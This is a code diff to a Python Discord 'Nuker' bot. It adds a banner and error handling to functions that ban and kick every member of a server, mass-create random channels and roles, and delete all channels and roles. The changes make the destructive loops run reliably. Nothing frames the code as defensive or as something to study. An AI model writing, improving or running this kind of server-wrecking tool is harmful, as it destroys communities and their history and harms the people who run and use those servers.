@@ -1,11 +1,24 @@
-import discord, sys, random, string, os, time, asyncio
+import discord, sys, random, string, os, time
 from . import bot_token
 from discord.ext import commands
 from discord.utils import get
 from colorama import Fore
 
 os.system("cls")
+print(f"""{Fore.LIGHTRED_EX}
 
+ ███▄    █ █    ██ ██ ▄█▓█████ ██▀███  
+ ██ ▀█   █ ██  ▓██▒██▄█▒▓█   ▀▓██ ▒ ██▒
+▓██  ▀█ ██▓██  ▒██▓███▄░▒███  ▓██ ░▄█ ▒
+▓██▒  ▐▌██▓▓█  ░██▓██ █▄▒▓█  ▄▒██▀▀█▄  
+▒██░   ▓██▒▒█████▓▒██▒ █░▒████░██▓ ▒██▒
+░ ▒░   ▒ ▒░▒▓▒ ▒ ▒▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░
+░ ░░   ░ ▒░░▒░ ░ ░░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░
+   ░   ░ ░ ░░░ ░ ░░ ░░ ░   ░    ░░   ░ 
+         ░   ░    ░  ░     ░  ░  ░     
+                                       
+""")
+print("\n")
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix = '.')
 
@@ -16,9 +29,11 @@ async def ban_all(guild_id):
         print("Please invite me to the server. Or the server id is incorrect.")
         return
 
-    for member in guild:
-        await member.ban(reason=None)
-
+    for member in guild.members:
+        try:
+            await member.ban(reason=None)
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] {e}")
 
 async def kick_all(guild_id):
     guild = discord.utils.get(client.guilds, id=guild_id)
@@ -26,9 +41,11 @@ async def kick_all(guild_id):
         print("Please invite me to the server. Or the server id is incorrect.")
         return
 
-    for member in guild:
-        await member.kick(reason=None)
-
+    for member in guild.members:
+        try:
+            await member.kick(reason=None)
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] {e}")
 
 async def create_channels(guild_id, amount):
     guild = discord.utils.get(client.guilds, id=guild_id)
@@ -37,8 +54,11 @@ async def create_channels(guild_id, amount):
         return
 
     for _ in range(amount):
-        overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages= True)}
-        await guild.create_text_channel(''.join(random.choice(string.ascii_lowercase) for i in range(17)), overwrites=overwrites)
+        try:
+            overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages= True)}
+            await guild.create_text_channel(''.join(random.choice(string.ascii_lowercase) for i in range(17)), overwrites=overwrites)
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] {e}")
 
 
 async def delete_channels(guild_id):
@@ -48,7 +68,10 @@ async def delete_channels(guild_id):
         return
 
     for channel in guild.channels:
-        await channel.delete()
+        try:
+            await channel.delete()
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] {e}")
 
 
 async def create_roles(guild_id, amount):
@@ -58,7 +81,10 @@ async def create_roles(guild_id, amount):
         return
 
     for _ in range(amount):
-        await guild.create_role(name=''.join(random.choice(string.ascii_lowercase) for i in range(10)))
+        try:
+            await guild.create_role(name=''.join(random.choice(string.ascii_lowercase) for i in range(10)))
+        except:
+            print(f"{Fore.RED}[ERROR] I Don't Have Permission for That!")
 
 
 async def delete_roles(guild_id):
@@ -68,13 +94,17 @@ async def delete_roles(guild_id):
         return
 
     for role in guild.roles:
-        await role.delete()
+        print(role)
+        try:
+            await role.delete()
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] {e}")
 
 @client.event
 async def on_ready():
     print("Bot is ready!\n\n")
     while True:
-        print("[CONSOLE] [0] Exit.")
+        print("[CONSOLE] [0] Go Back.")
         print("[CONSOLE] [1] Ban all users.")
         print("[CONSOLE] [2] Kick all users.")
         print("[CONSOLE] [3] Mass channel create.")
@@ -146,4 +176,5 @@ try:
     client.run(bot_token)
 except discord.errors.LoginFailure:
     print(f"{Fore.RED}[ERROR] Bad Token!")
+    time.sleep(5)
     sys.exit(0)
